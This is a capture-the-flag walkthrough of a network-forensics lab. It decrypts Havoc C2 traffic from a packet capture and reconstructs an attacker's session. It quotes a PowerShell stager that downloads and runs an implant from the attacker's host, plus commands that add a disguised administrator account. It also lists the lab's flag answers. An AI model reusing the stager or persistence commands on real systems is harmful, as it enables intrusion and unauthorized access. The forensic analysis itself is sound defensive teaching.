# TryHackMe: Mayhem — Walkthrough

**Date:** 2026-11-23  
**Room:** Mayhem  
**Analyst:** Will Lawson  
**Category:** Network Forensics / C2 Traffic Decryption (Havoc)

---

## Overview

Mayhem gives you a single packet capture and asks what an attacker did on a Windows server. The whole room turns on one fact: the traffic belongs to the **Havoc C2 framework**, and Havoc's first check-in packet carries the AES key and IV **unencrypted**. Once I pulled those out, every command the attacker sent and every result the agent returned decrypted cleanly, and all six answers were sitting in plain text.

**Answers:**

| # | Question | Answer |
|---|----------|--------|
| 1 | SID the attacker runs under | `S-1-5-21-679395392-3966376528-1349639417-1103` |
| 2 | Link-local IPv6 address of the server | `fe80::e134:1b0c:c8d5:3020%6` |
| 3 | Flag the attacker printed | `THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}` |
| 4 | Persistence account (user:pass) | `administrato:WfD3hz3AXZ4n` |
| 5 | Full path of the important file | `C:\Users\paco\Desktop\Files\clients.csv` |
| 6 | Flag inside that file | `THM{I_Can_SEE_ThE_fiL3_YoU_ToOk}` |

---

## Step 1 — Verifying and extracting the evidence

The room published an MD5 for the zip, so I checked it before touching anything. It matched (`a7d64354e4b8798cff6e063449c1e64f`). I extracted it into its own empty directory, as I do with any untrusted evidence:

```bash
md5sum evidence-1700022726858.zip
mkdir ev && cd ev && unzip ../evidence-1700022726858.zip
file *
# traffic.pcapng: pcapng capture file - version 1.0
```

The zip held one file, `traffic.pcapng`, so this was going to be a network forensics room.

---

## Step 2 — Getting the lay of the land

I wanted a conversation list and the HTTP requests first. I reached for `tshark`, but it wasn't installed in my analysis environment and its package wasn't available. Rather than fight the package manager, I switched to **scapy**. I wrote a few lines to rebuild the TCP payloads into streams keyed by (src, sport, dst, dport). (On Kali, `tshark -r traffic.pcapng -qz conv,tcp` and *Follow TCP Stream* in Wireshark give the same view.)

```
10.0.2.38:57344 -> 10.0.2.37:1337   GET /install.ps1
10.0.2.38:57345 -> 10.0.2.37:1337   GET /notepad.exe   (~96 KB back)
10.0.2.38:57346 -> 10.0.2.37:1337   GET /notepad.exe   (~96 KB back)
10.0.2.38:57347 -> 10.0.2.37:80     long-lived POST / beaconing
```

That's a small capture with a clear story. The victim is `10.0.2.38`, the attacker is `10.0.2.37`, and there are four TCP streams.

---

## Step 3 — The stager

The first stream was a PowerShell `Invoke-WebRequest` pulling `install.ps1` from a Python `SimpleHTTP` server on port 1337. The script was plain text:

```powershell
$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";
$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";
Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;
$65lmAtnzW8 = New-Object System.Net.WebClient;
$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);
Start-Process -Filepath $LA4rJgSPpx
```

The random variable names suggested a generated stager. It downloads the "notepad.exe" twice, once with `Invoke-WebRequest` and once with `WebClient`, which explains the two identical `/notepad.exe` streams, then runs it. That fake notepad is the implant. Its traffic is the port-80 stream.

---

## Step 4 — Identifying the C2: Havoc

The port-80 stream was a run of `POST /` requests with a spoofed Chrome User-Agent and `Content-Type: */*`. The bodies were binary, but every one started with the same structure:

```
00 00 01 13 | de ad be ef | 0e 9f b7 d8 | 00 00 00 63 | 00 00 00 00 | ...
  size        magic         agent ID      command       request ID
```

The **`0xDEADBEEF` magic** is the giveaway for a **Havoc Demon** agent. The first packet's command ID is `0x63` (99), which is `DEMON_INIT`, the agent's registration check-in. Most later requests were tiny 20-byte bodies (command `0x01`, a get-job poll) answered with 12 bytes of zeros, meaning no task queued. Every so often the server's reply was large. Those were the attacker's tasks.

---

## Step 5 — Recovering the key and decrypting

This is where Havoc is weak. In the `DEMON_INIT` packet, right after the 20-byte header, the agent sends its session crypto material **in the clear**:

| Offset | Length | Field |
|--------|--------|-------|
| 0 | 4 | size |
| 4 | 4 | magic `0xDEADBEEF` |
| 8 | 4 | agent ID |
| 12 | 4 | command (`0x63` DEMON_INIT) |
| 16 | 4 | request ID |
| **20** | **32** | **AES-256 key** |
| **52** | **16** | **IV** |
| 68 | … | AES-CTR-encrypted metadata |

The cipher is **AES-256-CTR**, and Havoc resets the counter to the IV for every message. That means each request body (after its 20-byte header) and each task payload decrypts independently with the same key and IV.

First I decrypted the init metadata to confirm I had the right offsets. It decrypted cleanly:

```
WIN-9H86M71MBE9 | paco | clientserver.thm | 10.0.2.38 | C:\Users\paco\Downloads\notepad.exe
```

That gave me the hostname, user, domain, IP, and implant path, so the key was right.

Next I needed the server's task format. Each job in a response is `CommandID (4, LE) | RequestID (4, LE) | Length (4, LE) | encrypted payload`, so I walked the response bodies in 12-byte headers plus payloads. Agent results are the request body after the 20-byte header. Here is the core of the script:

```python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import struct

init = request_bodies[0]
key, iv = init[20:52], init[52:68]

def dec(d):
    ctr = Counter.new(128, initial_value=int.from_bytes(iv, 'big'))
    return AES.new(key, AES.MODE_CTR, counter=ctr).decrypt(d)

# attacker tasks (server -> agent)
for body in response_bodies:
    i = 0
    while i + 12 <= len(body):
        cmd, rid, ln = struct.unpack('<III', body[i:i+12])
        print(hex(cmd), dec(body[i+12:i+12+ln]))
        i += 12 + ln

# agent results (agent -> server)
for body in request_bodies[1:]:
    if len(body) > 20:
        print(dec(body[20:]))
```

The capture uses HTTP keep-alive, and one response used chunked transfer encoding. I split the stream on `Content-Length` and de-chunked the one chunked reply before handing bodies to the parser.

---

## Step 6 — Reading the attacker's session

With everything decrypted, the session read like a shell history. The first big task (`0xA00`) was a COFF/BOF object file, an in-memory `whoami`-style module. After that the attacker ran a series of `cmd.exe /c` commands (Havoc's `shell` command, ID `0x1010`):

| Task | Command | Result |
|------|---------|--------|
| BOF | token/whoami module | `CLIENTSERVER\paco  S-1-5-21-679395392-3966376528-1349639417-1103`, High integrity, BUILTIN\Administrators |
| 1 | `ipconfig` | `Link-local IPv6 Address . . : fe80::e134:1b0c:c8d5:3020%6` |
| 2 | `systeminfo` | WIN-9H86M71MBE9, Server 2019, **Primary Domain Controller**, domain `clientserver.thm` |
| 3 | `echo THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}` | the printed flag |
| 4 | `net user administrato WfD3hz3AXZ4n /add` | completed successfully |
| 5 | `net localgroup administrators administrato /add` | completed successfully |
| 6 | `dir C:\Users\paco\Desktop\` | one folder: `Files` |
| 7 | `dir C:\Users\paco\Desktop\Files\` | `clients.csv` (555 bytes) |
| 8 | `type C:\Users\paco\Desktop\Files\clients.csv` | the client credential dump |

That answered the questions:

- **Q1 (SID):** the `whoami` output shows everything running as `paco`, SID ending `-1103`.
- **Q2 (IPv6):** the question says "exactly as you see it," so I kept the `%6` zone index from the `ipconfig` output. (`systeminfo` shows it without the `%6`. That's the trap.)
- **Q3:** the attacker literally `echo`'d the flag.
- **Q4:** the persistence account is **`administrato`**, with no trailing "r". It's a lookalike name meant to blend in next to the real Administrator account. It's easy to "correct" by mistake, so I copied it straight from the decrypted command. Password `WfD3hz3AXZ4n`.
- **Q5:** after browsing the Desktop, the attacker went straight to `C:\Users\paco\Desktop\Files\clients.csv`.
- **Q6:** the CSV is a username/password/email list for `clientserver.thm`. The last row, `wrait9`, has the flag in its password field: `THM{I_Can_SEE_ThE_fiL3_YoU_ToOk}`.

---

## Full Attack Chain

```
Victim WIN-9H86M71MBE9 (10.0.2.38, DC for clientserver.thm, user paco)
  │
  ├─ PowerShell → GET http://10.0.2.37:1337/install.ps1   (Python SimpleHTTP)
  │     └─ stager downloads notepad.exe (x2) → C:\Users\paco\Downloads\ → Start-Process
  │
  └─ notepad.exe = Havoc Demon → HTTP POST beacons to 10.0.2.37:80
        │  DEMON_INIT (0x63) leaks AES-256 key + IV in cleartext
        │  → AES-CTR decrypt all tasks/results
        │
        ├─ BOF whoami        → paco, SID ...-1103, High integrity       (Q1)
        ├─ ipconfig          → fe80::e134:1b0c:c8d5:3020%6              (Q2)
        ├─ systeminfo        → Server 2019, Primary Domain Controller
        ├─ echo THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}                 (Q3)
        ├─ net user administrato WfD3hz3AXZ4n /add                      (Q4)
        ├─ net localgroup administrators administrato /add
        ├─ dir Desktop → Files → clients.csv                            (Q5)
        └─ type clients.csv → THM{I_Can_SEE_ThE_fiL3_YoU_ToOk}          (Q6)
```

---

## Key Techniques & Gotchas

| Technique | Detail |
|-----------|--------|
| **Fingerprint the C2 first** | `0xDEADBEEF` magic + 20-byte header + command `0x63` on the first packet = Havoc Demon. Knowing the framework tells you exactly where the key lives. |
| **Havoc's key exchange is cleartext** | The AES-256 key (bytes 20–52) and IV (52–68) sit unencrypted in `DEMON_INIT`. Anyone with the pcap can decrypt the whole session. |
| **CTR restarts per message** | Each body decrypts on its own from the same IV. You don't have to track a running keystream across packets. |
| **Two directions, two layouts** | Agent→server: strip the 20-byte header. Server→agent: walk `cmd/reqid/len` (12-byte LE) job headers. |
| **Keep-alive + chunked** | Several POSTs share one TCP stream, and one reply was chunked. Parse by `Content-Length` and de-chunk, or the offsets drift. |
| **No tshark? Use scapy** | Rebuilding streams by 4-tuple in a few lines of Python was enough for this capture. Wireshark's *Follow TCP Stream* on Kali works equally well for the reading part. |
| **"Exactly as you see it"** | The IPv6 answer includes the `%6` zone ID from `ipconfig`. |
| **Lookalike account name** | `administrato` (no "r") is deliberate camouflage. Copy it verbatim. |
| **Third-party decryptors exist** | Public Havoc pcap parsers do the same job automatically, but the manual approach shows *why* the decryption works. |
